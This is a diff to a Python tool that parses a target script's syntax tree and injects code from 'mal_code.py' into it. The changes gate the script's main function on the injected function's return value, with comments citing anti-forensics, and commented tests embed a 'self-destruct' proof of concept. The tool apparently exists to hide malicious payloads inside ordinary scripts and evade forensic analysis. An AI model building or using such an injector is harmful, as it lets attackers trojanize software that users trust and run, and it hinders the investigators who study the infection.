@@ -56,12 +56,12 @@ def wrap_main_with_injected_function(tree, func_name, func_wrapped="main"):
     # Construct the call to `injected_function()`
     injected_call = ast.Call(func=ast.Name(id=func_name, ctx=ast.Load()), args=[], keywords=[])
 
-    # Construct the new if block
+    # Construct the new if block to check if it results in false (Adjusted for the Anti Foresics implementations)
     new_if_stmt = ast.If(
         test=ast.Compare(
             left=injected_call,
             ops=[ast.Eq()],
-            comparators=[ast.Constant(value=1)]
+            comparators=[ast.Constant(value=0)]
         ),
         body=[ast.Expr(value=ast.Call(func=ast.Name(id=func_wrapped, ctx=ast.Load()), args=[], keywords=[]))],
         orelse=[]
@@ -190,18 +190,18 @@ def embed_code(embed_code_filename="mal_code.py", src_code_filename='target_scri
 # if __name__ == '__main__':
 #     # Define my file names
 #     inj_file = "mal_code.py"
-#     new_name = "Result/mal_2.py"
+#     new_name = "export/mal_2.py"
 #     src_file = "testcode.py"
 #
 #     # normal wrapped main test
 #     embed_status = embed_code(embed_code_filename=inj_file, src_code_filename=src_file, new_name=new_name)
 #
-#     new_name = "Result/mal_3.py"
+#     new_name = "export/mal_3.py"
 #     # append test
 #     embed_status = embed_code(embed_code_filename=inj_file, src_code_filename=src_file, new_name=new_name, wrap=False)
 #
 #     inj_file = "../Self_Destruct/self_destruct_script_poc.py"
-#     new_name = "Result/mal_4.py"
+#     new_name = "export/mal_4.py"
 #     func_name = "call_main"
 #     # self dest test
 #     embed_status = embed_code(embed_code_filename=inj_file, src_code_filename=src_file, new_name=new_name, wrap=False,
